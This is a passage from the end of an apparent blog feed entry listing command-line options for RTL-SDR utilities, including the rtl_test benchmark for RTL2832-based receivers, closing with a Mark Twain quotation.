[-g gain (default: 0 for auto)]
[-s samplerate in Hz (default: 2048000 Hz)]
[-b number of buffers (default: 32, set by library)]
[-n max number of linked list buffers to keep (default: 500)]
[-d device index (default: 0)]
</code></pre>

<p>```</p>

<p><strong>rtl_test</strong></p>

<p>A benchmark tool for RTL2832 based DVB-T receivers</p>

<p>``` plain
Usage:</p>

<pre><code>[-s samplerate (default: 2048000 Hz)]
[-d device_index (default: 0)]
[-t enable Elonics E4000 tuner benchmark]
[-p enable PPM error measurement]
[-b output_block_size (default: 16 * 16384)]
[-S force sync output (default: async)]
</code></pre>

<p>```</p>

<blockquote><p>Noise proves nothing.  Often a hen who has merely laid an egg cackles
as if she laid an asteroid.</p>

<p>&mdash; Mark Twain</p></blockquote>
]]></content>
  </entry>
  
</feed>
